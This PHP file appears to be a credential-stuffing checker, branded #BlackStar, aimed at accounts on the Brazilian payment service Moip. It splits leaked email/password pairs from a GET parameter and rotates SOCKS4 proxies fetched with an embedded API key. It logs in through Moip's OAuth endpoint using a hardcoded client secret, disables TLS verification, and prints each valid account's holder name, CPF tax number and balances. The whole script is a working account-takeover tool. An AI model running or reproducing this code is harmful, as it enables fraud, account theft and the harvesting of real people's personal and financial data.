<?php

error_reporting(0);
set_time_limit(0);
DeletarCookies();

extract($_GET);

function deletarCookies() {
    if (file_exists("teste.txt")) {
        unlink("teste.txt");
    }
}

function multiexplode ($delimiters,$string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}


list($email, $senha) = multiexplode(array(";","|",":"," » "," "),$linhas);

function dados($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} //funcao para puxar os dados
        
        $link = file_get_contents("https://api.getproxylist.com/proxy?apiKey=2769d07972701a1cb65b10f9565e205f3fcd463a&protocol=socks4&lastTested=600");
        $link2 = json_decode($link);
        $link3 = $link2 ->ip;
        $link4 = $link2 ->port;
        $proxy = $link3.":".$link4;
        
        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://connect.moip.com.br/oauth/token");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.0.1");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: connect.moip.com.br',
        'Authorization: OAuth null',
        'User-Agent: okhttp/3.0.1',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        ));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'client_id=APP-RFB98QP9SFZ1&client_secret=05acb6e128bc48b2999582cd9a2b9787&grant_type=password&username='.$email.'&password='.$senha.'&state=20e61706fc4f7776&scope=APP_ADMIN');
        $resultt = curl_exec($ch);
        
        #echo $resultt;

        $id = dados($resultt, '"moipAccount":{"id":"MPA-','"', 1);
        $token = dados($resultt, '"access_token":"','"', 1);

        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://api.moip.com.br/v2/moipaccounts/MPA-$id");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.0.1");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: api.moip.com.br',
        'Authorization: OAuth '.$token.'',
        'User-Agent: okhttp/3.0.1',
        'Connection: keep-alive'
        ));
        curl_setopt($ch, CURLOPT_POST, 0);
        $result = curl_exec($ch);
        //echo $result;

        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://api.moip.com.br/v2/balances");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.0.1");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: api.moip.com.br',
        'Content-Type: application/json',
        'Authorization: OAuth '.$token.'',
        'User-Agent: okhttp/3.0.1',
        'Connection: keep-alive'
        ));
        curl_setopt($ch, CURLOPT_POST, 0);
        $result2 = curl_exec($ch);
        //echo $result2;

        $nome = dados($result, '"person":{"name":"','"', 1);
        $cpf = dados($result, '"CPF","number":"','"', 1);
        $saldo = dados($result2, '"unavailable":',',', 1);
        $bloq = dados($result2, '"future":',',', 1);
        $pen = dados($result2, '"current":',',', 1);



        if (strpos($resultt, '"accessToken"') !== false) {
    
            echo "<b><i><font style='color: green;'>Aprovada ✔&nbsp;&nbsp;</font></i>  $email|$senha | Nome: $nome | CPF: $cpf | Saldo: $saldo | Bloqueado: $bloq | Pendente: $pen | <font style='color: MidnightBlue;'>#BlackStar©</font></b>";
        }else{
             echo "<font style='color: red;'>Reprovada ❌</font>  $email|$senha <font style='color: DeepSkyBlue;'>#BlackStar©</font>";
        }

             if (file_exists(getcwd().'/teste.txt')) {
            unlink(getcwd().'/teste.txt');
        }
?>

